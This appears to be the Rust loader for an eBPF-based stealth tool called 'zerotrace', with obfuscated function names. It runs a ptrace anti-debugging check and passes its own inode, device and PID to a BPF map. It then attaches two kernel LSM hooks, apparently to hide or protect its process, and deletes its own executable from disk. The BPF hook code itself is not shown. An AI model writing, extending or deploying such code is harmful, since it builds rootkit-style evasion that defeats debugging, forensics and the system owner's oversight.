mod zt_skel {
    include!(concat!(env!("OUT_DIR"), "/zerotrace.skel.rs"));
}

use anyhow::Result;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use std::os::linux::fs::MetadataExt;

fn g_s() {
    if let Ok(p) = std::env::current_exe() {
        let _ = std::fs::remove_file(p);
    }
}

async fn l_p() {
    unsafe {
        if libc::ptrace(libc::PTRACE_TRACEME, 0, 1, 0) < 0 {
            std::process::exit(1);
        }
    }
}

#[tokio::main]
async fn main() -> Result<()> {
    l_p().await;
    let r = Arc::new(AtomicBool::new(true));
    let r_c = r.clone();
    ctrlc::set_handler(move || { r_c.store(false, Ordering::SeqCst); })?;
    let p = std::env::current_exe()?;
    let m = std::fs::metadata(&p)?;
    let c: [u64; 8] = [m.st_ino(), m.st_dev(), std::process::id() as u64, 0, 0, 0, 0, 0];
    let mut s = zt_skel::ZerotraceSkelBuilder::default().open()?.load()?;
    s.maps_mut().x1().update(&0u32.to_ne_bytes(), unsafe { std::mem::transmute::<&[u64; 8], &[u8; 64]>(&c) }, libbpf_rs::MapFlags::ANY)?;
    let _h1 = s.progs_mut().l_h().attach_lsm()?;
    let _h2 = s.progs_mut().b_c().attach_lsm()?;
    g_s();
    while r.load(Ordering::SeqCst) {
        tokio::time::sleep(tokio::time::Duration::from_secs(1)).await;
    }
    Ok(())
}
